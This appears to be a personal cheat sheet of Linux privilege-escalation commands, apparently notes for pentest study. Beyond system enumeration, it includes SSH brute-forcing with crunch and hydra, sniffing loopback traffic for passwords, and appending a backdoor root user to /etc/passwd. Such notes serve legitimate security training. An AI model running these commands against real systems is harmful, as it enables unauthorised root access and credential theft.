# linux privesc
please let me into the root fs, i am normal and can be trusted with knowledge of your drives

### // linux situational awareness
```
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/os-release
uname -a
ps aux
ip a
routel
ss -anp
cat /etc/iptables/rules.v4
ls -lah /etc/cron*
crontab -l
sudo crontab -l
dpkg -l
find / -writable -type d 2>/dev/null
cat /etc/fstab
mount
lsblk
lsmod
/sbin/modinfo <kernel_module>
find / -perm -u=s -type f 2>/dev/null
```

### // user trails
```
env
cat .bashrc
// generate a custom wordlist based on potenital passwords
crunch <min> max<> -t <word>%%% > wordlist
// bruteforce w/ generated wordlist
hydra -l <user> -P wordlist <tgt_ip> -t 4 ssh -V
```

### // inspecting service footprints
```
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

### // abusing cron jobs
```
grep "CRON" /var/log/syslog
```

### // abusing password authentication
```
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
w00t
id
```

### // abusing setuid binaries and capabilities
```
// search for suid bins
https://gtfobins.github.io/
```

### // abusing sudo
```
// what can we run as sudo with our current user?
sudo -l
```

### // exploiting kernel vulnerabilities
```
cat /etc/issue
uname -r 
arch
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```


